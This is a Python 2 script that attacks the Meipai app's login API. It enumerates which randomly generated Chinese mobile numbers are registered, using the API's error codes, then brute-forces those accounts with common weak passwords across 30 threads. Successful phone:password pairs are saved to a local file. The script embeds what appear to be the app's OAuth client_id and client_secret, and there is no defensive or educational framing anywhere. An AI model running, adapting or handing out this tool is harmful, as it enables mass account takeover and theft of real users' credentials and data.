# Created by TTc9082 on 7/30/16
#!/usr/bin/env python
# coding=utf8
# author=evi1m0#ff0000.cc
# create=20150216


import json
import random
import requests
import threadpool as tp


def _burp(phone):
    for pwd in ['123456', '111111', '000000', phone]:
        api_url = 'https://newapi.meipai.com/oauth/access_token.json'
        data = {'phone': phone,
                'client_id': '1089857299',
                'client_secret': '25d6b401598f4a934d0e',
                'grant_type': 'phone',
                'password': pwd,}
        try:
            print '[*] Burp Phone: %s' % phone
            req = requests.post(api_url, data=data, timeout=5)
        except:
            continue
        try:
            success = json.loads(req.content)['access_token']
            burp_success = open('./meipai_account.txt', 'a+')
            burp_success.write('%s:::%s\n'%(phone, pwd))
            burp_success.close()
            print success
            return success
        except:
            success = 0
            print '[-] Burp False'
            continue


def _status(args):
    flag = 0
    while True:
        flag += 1
        phone_number = random.choice(['188','185','158','153','186','136','139','135'])\
                       +"".join(random.sample("0123456789",8 ))
        payload = {'phone': phone_number, 'password': '222222',
                   'client_id': '1089857299', 'client_secret': '25d6b401598f4a934d0e',
                   'grant_type': 'phone'}
        api_url = 'https://newapi.meipai.com/oauth/access_token.json'
        try:
            print '[%s] Test Phone: %s' % (flag, phone_number)
            req = requests.post(api_url, data=payload, timeout=3)
            print req.content
            req_status = json.loads(req.content)['error_code']
        except:
            req_status = 0
        if req_status == 21402 or req_status == 23801:
            success_f = open('./success_reg_phone.txt', 'a+')
            success_f.write('%s\n'%phone_number)
            success_f.close()
            _burp(phone_number)
            print '\n[OK] Phone: %s\n' % phone_number


if __name__ == '__main__':
    args = []
    for i in range(30):
        args.append(args)
    pool = tp.ThreadPool(30)
    reqs = tp.makeRequests(_status, args)
    [pool.putRequest(req) for req in reqs]
    pool.wait()


# payload = {'phone': '13400987287', 'password': '22222',
#                    'client_id': '1089857299', 'client_secret': '25d6b401598f4a934d0e',
#                    'grant_type': 'phone'}
# res = requests.post('https://newapi.meipai.com/oauth/access_token.json', data=payload)
# user_info = res.json()
# print user_info